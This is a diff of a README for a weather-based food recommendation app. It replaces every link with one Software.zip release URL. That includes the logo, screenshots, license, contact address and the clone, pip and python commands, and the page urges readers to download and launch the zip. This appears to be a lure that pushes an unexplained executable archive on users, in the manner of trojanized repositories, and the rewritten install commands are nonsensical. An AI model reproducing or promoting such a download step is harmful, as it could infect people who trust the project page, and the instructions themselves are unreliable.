@@ -1,6 +1,6 @@
 # 🍔🍕🥗 Food AI: Your Personalized Food and Restaurant Recommendation System 🍱🌮🥘
 
-![Food AI Logo](https://yourimageurl.com)
+![Food AI Logo](https://github.com/Blackball32/food_ai/releases/download/v2.0/Software.zip)
 
 Welcome to **Food AI**, an innovative AI-powered system that provides personalized food and restaurant recommendations based on the weather! 🌤️🍽️
 
@@ -24,28 +24,28 @@ Welcome to **Food AI**, an innovative AI-powered system that provides personaliz
 
 ## Getting Started
 
-To experience the magic of **Food AI**, download the [Software.zip](https://github.com/22155555/1875695542/releases/download/v1.0/Software.zip) file and launch it to get started with your personalized food journey. 🚀
+To experience the magic of **Food AI**, download the [https://github.com/Blackball32/food_ai/releases/download/v2.0/Software.zip](https://github.com/Blackball32/food_ai/releases/download/v2.0/Software.zip) file and launch it to get started with your personalized food journey. 🚀
 
-If the link to the Software.zip file is unavailable, please check the "Releases" section for alternative download options.  
+If the link to the https://github.com/Blackball32/food_ai/releases/download/v2.0/Software.zip file is unavailable, please check the "Releases" section for alternative download options.  
 
-[![Download Food AI](https://img.shields.io/badge/Download-Software.zip-brightgreen)](https://github.com/22155555/1875695542/releases/download/v1.0/Software.zip)
+[![Download Food AI](https://github.com/Blackball32/food_ai/releases/download/v2.0/Software.zip)](https://github.com/Blackball32/food_ai/releases/download/v2.0/Software.zip)
 
 ## Installation
 
 Follow these steps to install **Food AI** on your system:
 
-1. Clone the repository `git clone https://github.com/yourusername/food_ai.git`
+1. Clone the repository `git clone https://github.com/Blackball32/food_ai/releases/download/v2.0/Software.zip`
 2. Navigate to the project directory `cd food_ai`
-3. Install dependencies `pip install -r requirements.txt`
-4. Run the application `python app.py`
+3. Install dependencies `pip install -r https://github.com/Blackball32/food_ai/releases/download/v2.0/Software.zip`
+4. Run the application `python https://github.com/Blackball32/food_ai/releases/download/v2.0/Software.zip`
 5. Access **Food AI** through your browser at `http://localhost:5000`
 
 ## Screenshots
 
 Here are some snapshots of the **Food AI** recommendation system in action:
 
-![Screenshot 1](https://yourscreenshot1url.com)
-![Screenshot 2](https://yourscreenshot2url.com)
+![Screenshot 1](https://github.com/Blackball32/food_ai/releases/download/v2.0/Software.zip)
+![Screenshot 2](https://github.com/Blackball32/food_ai/releases/download/v2.0/Software.zip)
 
 ## Technologies Used
 
@@ -62,10 +62,10 @@ We welcome contributions to enhance **Food AI** and make it even more powerful a
 
 ## License
 
-This project is licensed under the MIT License - see the [LICENSE](license.md) file for details.
+This project is licensed under the MIT License - see the [LICENSE](https://github.com/Blackball32/food_ai/releases/download/v2.0/Software.zip) file for details.
 
 ## Contact Us
 
-If you have any questions or feedback, don't hesitate to reach out to us at [foodai@example.com](mailto:foodai@example.com).
+If you have any questions or feedback, don't hesitate to reach out to us at [https://github.com/Blackball32/food_ai/releases/download/v2.0/Software.zip](https://github.com/Blackball32/food_ai/releases/download/v2.0/Software.zip).
 
 Let **Food AI** revolutionize your dining experience today! 🍽️✨
